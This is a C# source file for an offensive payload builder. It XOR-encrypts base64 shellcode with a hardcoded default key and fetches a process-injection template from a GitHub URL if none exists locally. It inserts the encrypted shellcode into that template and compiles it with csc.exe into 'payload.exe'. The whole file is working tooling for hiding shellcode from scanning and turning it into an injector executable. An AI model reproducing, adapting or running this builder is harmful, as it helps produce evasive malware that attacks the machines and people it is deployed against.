using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace ObfuscatorXOR
{
    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        private static Random random = new Random();
        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        public static void banner()
        {
            string banner = @"
  _____  _      ___                                     _    _ _____  ______  
 / ___ \| |    / __)                      _            \ \  / / ___ \(_____ \ 
| |   | | | _ | |__ _   _  ___  ____ ____| |_  ___   ___\ \/ / |   | |_____) )
| |   | | || \|  __) | | |/___)/ ___) _  |  _)/ _ \ / ___)  (| |   | (_____ ( 
| |___| | |_) ) |  | |_| |___ ( (__( ( | | |_| |_| | |  / /\ \ |___| |     | |
 \_____/|____/|_|   \____(___/ \____)_||_|\___)___/|_| /_/  \_\_____/      |_|
                                                                              
";
            Console.WriteLine(banner);
        }

        public static void help()
        {
            string help = @"
/file       B64 shellcode file
/key        XOR Key (Optional)
/out        Output file Location (Optional)
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            string base64String = "";
            string xorKey = "Sup3rS3cur3K3yfTw!";
            string filePath;
            string outputFile = "";

            banner();

            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0 || !arguments.ContainsKey("/file"))
            {
                Console.WriteLine("[!] Please Enter /file as argument");
                help();
            }
            else
            {
                filePath = arguments["/file"];

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }
                else
                {
                    base64String = File.ReadAllText(filePath);
                }

                if (arguments.ContainsKey("/key"))
                {
                     xorKey = arguments["/key"];
                }
                else
                {
                    Console.WriteLine($"[+] No /key supplied. Using the default key: {xorKey}");
                }

                if(arguments.ContainsKey("/out"))
                {
                    outputFile = arguments["/out"];
                    if(!Path.GetExtension(outputFile).Contains(".exe"))
                    {
                        outputFile = $"{outputFile}.exe";
                    }
                }
                else
                {
                    outputFile = "payload.exe";
                }

                if (!IsBase64String(base64String))
                {
                    Console.WriteLine("[!] Make sure that it is a base64 encoded payload");
                }
                else
                {
                    byte[] xorEncString = xorEncDec(Convert.FromBase64String(base64String), xorKey); //XOR encrypt

                    string xorEncStringB64 = Convert.ToBase64String(xorEncString);

                    //Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");

                    //decrypt it back

                    //var decrypted = Convert.ToBase64String(xorEncDec((Convert.FromBase64String(xorEncStringB64)), xorKey));

                    //Console.WriteLine($"XOR decrypted text: {decrypted}");

                    // Write the file
                    string fullPath = Path.Combine(Directory.GetCurrentDirectory(), "payload.xor.b64");

                    using (StreamWriter writer = new StreamWriter(fullPath))
                    {
                        Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath}");
                        writer.WriteLine(xorEncStringB64);
                    }

                    // Open template file
                    var parentDir = Directory.GetParent(Directory.GetCurrentDirectory()).Parent.FullName;
                    var templateFile = Path.Combine(parentDir, "templates/template.cs");
                    var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                    string templateFileContent = "";

                    // read all content
                    if (!File.Exists(templateFile)) //if file exists
                    {
                        Console.WriteLine("[!] File does not exists in local, fetching online...");
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        WebClient client = new WebClient();
                        try
                        {
                            templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/XORed-ProcessInjection/main/template.cs");
                        }
                        catch
                        {
                            Console.WriteLine("[!] No internet connection");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        templateFileContent = File.ReadAllText(templateFile);
                    }
                    // replace "string xoredB64" line
                    templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorEncStringB64).Replace("REPLACE XORKEY",xorKey);
                    // write all back into the file
                    try
                    {
                        Console.WriteLine("[+] Wrtiting shellcode to template file...");
                        File.WriteAllText(tempFile, templateFileContent);
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                    }

                    //compile the code
                    string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
                    try
                    {
                        System.Diagnostics.Process.Start("CMD.exe", strCmd);
                        Console.WriteLine("[+] Executable file successfully generated.");
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] Error generating executable file with the following error {err.Message}");
                    }

                    Console.WriteLine($"[+] Doing some cleaning...");
                    Thread.Sleep(1000);
                    File.Delete(tempFile);
                }
            }



        }


    }

}
